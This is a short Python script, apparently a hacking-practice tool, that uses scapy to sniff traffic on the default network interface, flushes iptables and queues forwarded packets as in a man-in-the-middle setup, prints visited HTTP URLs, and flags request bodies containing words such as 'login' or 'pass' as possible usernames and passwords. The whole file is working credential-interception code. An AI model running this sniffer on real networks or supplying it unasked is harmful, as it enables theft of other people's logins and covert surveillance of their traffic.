import scapy.all as scapy
from scapy.layers import http
from colorama import Fore
from subprocess import check_output, call

def sniff(interface=check_output("ip route | grep '^default' | awk '{print $5}'", shell=True, text=True).strip(), filter = True):
    call(['iptables', '--flush'])
    call('iptables -I FORWARD -j NFQUEUE --queue-num 0'.split())
    scapy.sniff(iface=interface, store=False, prn=lambda packet: packet_filter(packet))

def packet_filter(packet):
    try:
        print(packet.show())
        if packet.haslayer(http.HTTPRequest):
            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
            print(f'[URL] HTTP Request >> {url}')
            if packet.haslayer(scapy.Raw):
                packet_log = packet[scapy.Raw].load
                keywords = ['login', 'user', 'pass', 'name', 'box']
                for keyword in keywords:
                    if keyword in packet_log.decode().lower():
                        print(f'\n\n[RAW] Possible username/password: {packet_log}\n\n')
                        break
    except KeyboardInterrupt:
        pass
    except:
        print(Fore.RED + f'[Error] {type(Exception).__name__}' + Fore.RESET)

if __name__ == '__main__':
    sniff()
